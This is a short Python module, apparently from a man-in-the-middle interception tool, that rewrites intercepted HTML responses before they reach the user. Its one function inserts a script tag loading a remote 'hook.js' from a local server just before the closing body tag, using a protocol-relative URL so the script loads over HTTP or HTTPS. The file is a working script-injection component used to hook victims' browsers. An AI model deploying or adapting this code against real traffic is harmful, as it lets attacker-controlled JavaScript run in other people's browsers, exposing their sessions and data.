'''
Handles the actual modification of data
Called by the interceptor.py right before the response is sent back to the user
'''
import re

def inject_payload(html_content):
    # Use // instead of http:// so the browser matches the page protocol (HTTP or HTTPS)
    payload = '<script src="//127.0.0.1:5000/static/hook.js"></script>' 
    
    # Find </body> and replace it with our script tag + </body>
    modified_content = re.sub(r'</body>', f'{payload}</body>', html_content, flags=re.IGNORECASE)
    return modified_content
